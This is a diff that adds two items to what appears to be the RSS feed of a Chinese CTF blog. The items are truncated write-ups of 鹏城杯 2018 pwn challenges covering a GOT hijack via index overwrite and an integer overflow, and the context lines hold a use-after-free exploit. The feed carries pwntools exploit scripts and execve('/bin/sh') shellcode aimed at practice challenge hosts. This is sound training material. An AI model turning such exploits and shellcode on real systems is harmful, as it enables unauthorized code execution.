@@ -560,5 +560,45 @@ void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (
 #!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x08048986p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;aaaa&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;bbbb&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.</description>
     </item>
     
+    <item>
+      <title>鹏城杯_2018_note</title>
+      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</guid>
+      <description>鹏城杯_2018_note 鹏城杯_2018_note
+写在前面： 目前的目标是强化分析漏洞点的能力，所以会重点书写漏洞的成因。
+题目分析 我们先静态分析二进制文件：
+其中，漏洞在于：
+这里nptr只有10个字节，但却可以往nptr所在的地址写入15个字节
+而根据上面栈的结构，就可以知道，这里多出来的5个字节就会覆盖到index的地址上，而index是用来寻找content地址的。
+我们点击进content：
+注意地址，是在bss段，我们往上拉就可以看到got表：
+这里地址相差了：
+也就意味着，我们如果可以将index覆盖成-64，我们就可以劫持got表中exit函数的地址
+这时我们就需要查看一下汇编：
+通过上面的注释，我们可以看到，如果想要将got表中的exit地址改为malloc函数分配的地址，我们需要将上面的-64除以8：
+所以我们只需要将index覆盖成为0xFFFFFFF8，就可以劫持got表的exit函数
+exp from pwn import *context(arch=&amp;#39;amd64&amp;#39;, os=&amp;#39;linux&amp;#39;, log_level=&amp;#39;debug&amp;#39;)file_name = &amp;#39;./2018_note&amp;#39;r = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 29319)elf = ELF(file_name)def dbg():gdb.attach(r)def add(index, size, content):r.sendline(&amp;#39;1&amp;#39;)sleep(0.1)r.sendline(str(index))sleep(0.1)r.sendline(size)sleep(0.1)r.sendline(content)p1 = asm(&amp;#39;&amp;#39;&amp;#39;mov rsi, 0x0068732f6e69622fjmp $+0x16&amp;#39;&amp;#39;&amp;#39;)p2 = asm(&amp;#39;&amp;#39;&amp;#39;push rsimov rdi, rspjmp $+0x1c&amp;#39;&amp;#39;&amp;#39;)p3 = asm(&amp;#39;&amp;#39;&amp;#39;xor rax, raxmov al, 0x3bjmp $+0x1b&amp;#39;&amp;#39;&amp;#39;)p4 = asm(&amp;#39;&amp;#39;&amp;#39;xor rsi, rsixor rdx, rdxsyscall&amp;#39;&amp;#39;&amp;#39;)add(0, b&amp;#39;13&amp;#39;.</description>
+    </item>
+    
+    <item>
+      <title>鹏城杯_2018_overint</title>
+      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</guid>
+      <description>鹏城杯_2018_overint 题目：鹏城杯_2018_overint
+写在前面： 目前阶段是想寻找并解决基础知识上的一些漏洞。所以文章的重点会放在理论和分析上，而对漏洞的利用则不会详细讲解。
+漏洞分析： 其实这道题的漏洞已经写在题目上了，是整数溢出。
+在题目中的体现便是：
+这里变量int_long已经远远大于4，但变量int_v12是一个有符号的整型。
+根据上图，有符号整型的正数部分最大到0x7fffffff。所以只要我们将int_v12+int_long的值大于0x7fffffff，那么计算机就会认为其为负数，从而使int_v12 &amp;gt; 4 为False
+题目流程分析 程序首先调用了这个qmencpy函数，创造了一个内存空间用来存放我们输入的字符。这一段空间很重要，因为后面的漏洞利用我们会用到这段空间。
+随后会让我们输入4个字符，并且将这个四个字符放入check_1函数进行检测：
+因为只需要返回35，所以我们直接写个脚本，跑一下就好了：
+#!/usr/bin/python3def check1():for i in range(100):for j in range(100):for k in range(100):for l in range(100):v3 = 0v3 = ((i &amp;gt;&amp;gt; 4) + 4 * v3) ^ (i &amp;lt;&amp;lt; 10)v3 = ((j &amp;gt;&amp;gt; 4) + 4 * v3) ^ (j &amp;lt;&amp;lt; 10)v3 = ((k &amp;gt;&amp;gt; 4) + 4 * v3) ^ (k &amp;lt;&amp;lt; 10)v3 = ((l &amp;gt;&amp;gt; 4) + 4 * v3) ^ (l &amp;lt;&amp;lt; 10)if v3 == 35 and i == 5:print(&amp;#39;[+] %d, %d, %d, %d&amp;#39; % (i, j, k, l))check1() 但需要注意的是，并不是所有的结果都可以使用。因为这个结果会和上面说到的int_long相加，故必须要大于0x5F9CCC8E(0x80000000-int_long)。</description>
+    </item>
+    
   </channel>
 </rss>
